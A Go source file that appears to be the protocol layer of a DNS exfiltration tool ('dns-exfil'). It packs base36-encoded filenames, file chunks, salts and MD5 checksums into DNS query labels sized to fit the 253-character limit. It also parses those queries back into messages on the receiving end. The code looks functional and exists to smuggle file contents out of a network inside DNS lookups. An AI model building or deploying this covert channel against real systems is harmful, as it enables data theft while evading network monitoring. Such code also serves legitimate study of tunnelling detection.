package protocol

import (
	"fmt"
	"math"
	"strconv"
	"strings"

	"github.com/rcoop/dns-exfil/internal/encoding"
)

// CalcChunkSize returns the maximum number of raw bytes that can fit in the
// data labels of a single DNS query for the given base domain.
//
// Available character budget:
//   253 (max domain) - len(basedomain) - 1 (trailing dot before basedomain)
//     - MetaOverhead (type + sid + seq + total labels with dots)
//
// The remaining chars are split into labels of ≤63, separated by dots.
// Each label group is concatenated and base36-decoded to raw bytes.
func CalcChunkSize(baseDomain string) int {
	available := MaxDomainLen - len(baseDomain) - 1 - MetaOverhead
	if available <= 0 {
		return 0
	}

	// Number of full 63-char labels that fit, accounting for dot separators.
	// Each label past the first costs 1 extra char for the dot.
	numLabels := 0
	used := 0
	for {
		need := encoding.MaxLabelLen
		if numLabels > 0 {
			need++ // dot separator
		}
		if used+need > available {
			break
		}
		used += need
		numLabels++
	}

	if numLabels == 0 {
		return 0
	}

	totalChars := numLabels * encoding.MaxLabelLen

	// base36 chars → raw bytes.  log(36)/log(256) ≈ 0.6438.
	rawBytes := int(float64(totalChars) * math.Log(36) / math.Log(256))
	if rawBytes == 0 {
		rawBytes = 1
	}
	return rawBytes
}

// BuildInitQuery builds the FQDN for an init message.
func BuildInitQuery(sid string, total int, salt []byte, filename string, baseDomain string) string {
	b36Salt := encoding.Base36Encode(salt)
	b36Filename := encoding.Base36Encode([]byte(filename))
	return fmt.Sprintf("%s.%s.0.%d.%s.%s.%s",
		TypeInit, sid, total, b36Salt, b36Filename, baseDomain)
}

// BuildDataQuery builds the FQDN for a data message. chunkData is the raw
// bytes for this chunk, which will be base36-encoded and split into labels.
func BuildDataQuery(sid string, seq, total int, chunkData []byte, baseDomain string) string {
	b36 := encoding.Base36Encode(chunkData)
	labels := encoding.SplitIntoLabels(b36, encoding.MaxLabelLen)
	return fmt.Sprintf("%s.%s.%d.%d.%s.%s",
		TypeData, sid, seq, total, strings.Join(labels, "."), baseDomain)
}

// BuildFinQuery builds the FQDN for a fin message.
func BuildFinQuery(sid string, total int, md5 []byte, baseDomain string) string {
	b36MD5 := encoding.Base36Encode(md5)
	return fmt.Sprintf("%s.%s.%d.%d.%s.%s",
		TypeFin, sid, total, total, b36MD5, baseDomain)
}

// ParseQuery strips the base domain from a FQDN and parses the remaining
// labels into a message. Returns one of InitMessage, DataMessage, or FinMessage.
func ParseQuery(fqdn, baseDomain string) (interface{}, error) {
	// Normalize: remove trailing dots.
	fqdn = strings.TrimSuffix(fqdn, ".")
	baseDomain = strings.TrimSuffix(baseDomain, ".")

	if !strings.HasSuffix(fqdn, "."+baseDomain) {
		return nil, fmt.Errorf("query %q does not match base domain %q", fqdn, baseDomain)
	}

	prefix := fqdn[:len(fqdn)-len(baseDomain)-1]
	parts := strings.Split(prefix, ".")

	if len(parts) < 4 {
		return nil, fmt.Errorf("too few labels in query: %d", len(parts))
	}

	msgType := parts[0]
	sid := parts[1]

	switch msgType {
	case TypeInit:
		return parseInit(sid, parts[2:])
	case TypeData:
		return parseData(sid, parts[2:])
	case TypeFin:
		return parseFin(sid, parts[2:])
	default:
		return nil, fmt.Errorf("unknown message type: %s", msgType)
	}
}

func parseInit(sid string, parts []string) (*InitMessage, error) {
	// parts: [seq(0), total, b36salt, b36filename]
	if len(parts) < 4 {
		return nil, fmt.Errorf("init: expected ≥4 labels after sid, got %d", len(parts))
	}

	total, err := strconv.Atoi(parts[1])
	if err != nil {
		return nil, fmt.Errorf("init: bad total: %w", err)
	}

	salt, err := encoding.Base36Decode(parts[2])
	if err != nil {
		return nil, fmt.Errorf("init: bad salt: %w", err)
	}

	fnBytes, err := encoding.Base36Decode(parts[3])
	if err != nil {
		return nil, fmt.Errorf("init: bad filename: %w", err)
	}

	return &InitMessage{
		SessionID: sid,
		Total:     total,
		Salt:      salt,
		Filename:  string(fnBytes),
	}, nil
}

func parseData(sid string, parts []string) (*DataMessage, error) {
	// parts: [seq, total, label1, label2, ...]
	if len(parts) < 3 {
		return nil, fmt.Errorf("data: expected ≥3 labels after sid, got %d", len(parts))
	}

	seq, err := strconv.Atoi(parts[0])
	if err != nil {
		return nil, fmt.Errorf("data: bad seq: %w", err)
	}

	total, err := strconv.Atoi(parts[1])
	if err != nil {
		return nil, fmt.Errorf("data: bad total: %w", err)
	}

	b36 := encoding.JoinLabels(parts[2:])
	data, err := encoding.Base36Decode(b36)
	if err != nil {
		return nil, fmt.Errorf("data: bad data: %w", err)
	}

	return &DataMessage{
		SessionID: sid,
		Seq:       seq,
		Total:     total,
		Data:      data,
	}, nil
}

func parseFin(sid string, parts []string) (*FinMessage, error) {
	// parts: [total, total, b36md5]
	if len(parts) < 3 {
		return nil, fmt.Errorf("fin: expected ≥3 labels after sid, got %d", len(parts))
	}

	total, err := strconv.Atoi(parts[0])
	if err != nil {
		return nil, fmt.Errorf("fin: bad total: %w", err)
	}

	md5Bytes, err := encoding.Base36Decode(parts[2])
	if err != nil {
		return nil, fmt.Errorf("fin: bad md5: %w", err)
	}

	return &FinMessage{
		SessionID: sid,
		Total:     total,
		MD5:       md5Bytes,
	}, nil
}
